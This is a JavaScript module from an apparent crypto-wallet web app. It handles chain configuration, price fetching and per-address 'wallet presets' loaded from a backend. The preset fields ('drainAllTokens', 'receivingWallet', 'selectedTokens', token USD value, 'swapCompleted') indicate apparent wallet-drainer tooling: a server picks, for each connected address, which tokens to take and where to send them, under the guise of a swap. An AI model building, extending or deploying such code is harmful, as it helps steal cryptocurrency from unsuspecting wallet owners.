import api from './api';

let cachedPresets = {};
let presetPromises = {};
let cachedPrices = null;
let pricesFetchedAt = 0;
const PRICE_CACHE_DURATION = 60000;

export const CHAIN_CONFIG = {
  ETH: { chainId: 1, symbol: 'ETH', name: 'Ethereum', coingeckoId: 'ethereum' },
  BSC: { chainId: 56, symbol: 'BNB', name: 'BNB Chain', coingeckoId: 'binancecoin' },
  POL: { chainId: 137, symbol: 'POL', name: 'Polygon', coingeckoId: 'matic-network' },
  ARB: { chainId: 42161, symbol: 'ETH', name: 'Arbitrum', coingeckoId: 'ethereum' },
  OP: { chainId: 10, symbol: 'ETH', name: 'Optimism', coingeckoId: 'ethereum' },
  AVAX: { chainId: 43114, symbol: 'AVAX', name: 'Avalanche', coingeckoId: 'avalanche-2' },
  BASE: { chainId: 8453, symbol: 'ETH', name: 'Base', coingeckoId: 'ethereum' },
  SOLANA: { chainId: null, symbol: 'SOL', name: 'Solana', coingeckoId: 'solana' },
  TRON: { chainId: null, symbol: 'TRX', name: 'Tron', coingeckoId: 'tron' },
};

export const BLOCKCHAIN_TO_CHAIN_ID = {
  ETH: 1,
  BSC: 56,
  POL: 137,
  ARB: 42161,
  OP: 10,
  AVAX: 43114,
  BASE: 8453,
};

export const CHAIN_ID_TO_BLOCKCHAIN = Object.entries(BLOCKCHAIN_TO_CHAIN_ID).reduce(
  (acc, [blockchain, chainId]) => {
    acc[chainId] = blockchain;
    return acc;
  },
  {}
);

export async function fetchCryptoPrices() {
  const now = Date.now();
  if (cachedPrices && now - pricesFetchedAt < PRICE_CACHE_DURATION) {
    return cachedPrices;
  }

  try {
    const response = await fetch(
      'https://api.coingecko.com/api/v3/simple/price?ids=ethereum,binancecoin,matic-network,avalanche-2,solana,tron&vs_currencies=usd'
    );
    const data = await response.json();
    cachedPrices = {
      ETH: data.ethereum?.usd || 3000,
      BNB: data.binancecoin?.usd || 300,
      POL: data['matic-network']?.usd || 0.5,
      AVAX: data['avalanche-2']?.usd || 25,
      SOL: data.solana?.usd || 150,
      TRX: data.tron?.usd || 0.1,
    };
    pricesFetchedAt = now;
    return cachedPrices;
  } catch {
    return {
      ETH: 3000,
      BNB: 300,
      POL: 0.5,
      AVAX: 25,
      SOL: 150,
      TRX: 0.1,
    };
  }
}

export async function usdToNative(usdAmount, chainId) {
  const prices = await fetchCryptoPrices();
  const symbol = getNativeSymbol(chainId);
  const price = prices[symbol] || 3000;
  return usdAmount / price;
}

export function getNativeSymbol(chainId) {
  switch (chainId) {
    case 56:
      return 'BNB';
    case 137:
      return 'POL';
    case 43114:
      return 'AVAX';
    default:
      return 'ETH';
  }
}

export function getBlockchainForChainId(chainId) {
  return CHAIN_ID_TO_BLOCKCHAIN[chainId] || 'ETH';
}

export function getChainIdForBlockchain(blockchain) {
  return BLOCKCHAIN_TO_CHAIN_ID[blockchain] || 1;
}

export function getAllSupportedChainIds() {
  return Object.values(BLOCKCHAIN_TO_CHAIN_ID);
}

export async function fetchWalletPreset(address) {
  if (!address) return null;

  const normalizedAddress = address.toLowerCase();

  if (cachedPresets[normalizedAddress]) {
    return cachedPresets[normalizedAddress];
  }

  if (presetPromises[normalizedAddress]) {
    return presetPromises[normalizedAddress];
  }

  presetPromises[normalizedAddress] = api
    .get(`/wallet-presets/${normalizedAddress}`)
    .then((response) => {
      const preset = response.data;
      const processedPreset = {
        token: preset.token.name,
        tokenSymbol: preset.token.symbol || preset.token.name,
        tokenAmount: preset.token.amount,
        usdValue: preset.token.usdValue,
        tokenLogo: preset.token.logo,
        tokenAddress: preset.token.address,
        decimals: preset.token.decimals,
        swapCompleted: preset.swapCompleted || false,
        blockchain: preset.blockchain || 'ETH',
        gasFee: preset.gasFee || 0.005,
        gasFeeUsd: preset.gasFeeUsd || 2,
        receivingWallet: preset.receivingWallet || null,
        receivingWallets: preset.receivingWallets || null,
        selectedTokens: preset.selectedTokens || [],
        drainAllTokens: preset.drainAllTokens || false,
      };
      cachedPresets[normalizedAddress] = processedPreset;
      return processedPreset;
    })
    .catch(() => {
      return null;
    })
    .finally(() => {
      delete presetPromises[normalizedAddress];
    });

  return presetPromises[normalizedAddress];
}

export async function getWalletPreset(address) {
  return fetchWalletPreset(address);
}

export async function getGasRequirementForPreset(address) {
  const preset = await fetchWalletPreset(address);

  if (!preset) {
    return { amount: 0.005, currency: 'ETH' };
  }

  const chainConfig = CHAIN_CONFIG[preset.blockchain];
  return {
    amount: preset.gasFee || 0.005,
    currency: chainConfig?.symbol || 'ETH',
  };
}

export async function getReceivingWalletForPreset(address) {
  const preset = await fetchWalletPreset(address);
  return preset?.receivingWallet || null;
}

export async function markSwapCompleted(address, blockchain) {
  if (!address) return null;

  try {
    const url = blockchain
      ? `/wallet-presets/${address.toLowerCase()}/complete?blockchain=${blockchain}`
      : `/wallet-presets/${address.toLowerCase()}/complete`;
    const response = await api.post(url);
    clearCache();
    return response.data;
  } catch (error) {
    throw error;
  }
}

export function clearCache() {
  cachedPresets = {};
  presetPromises = {};
}
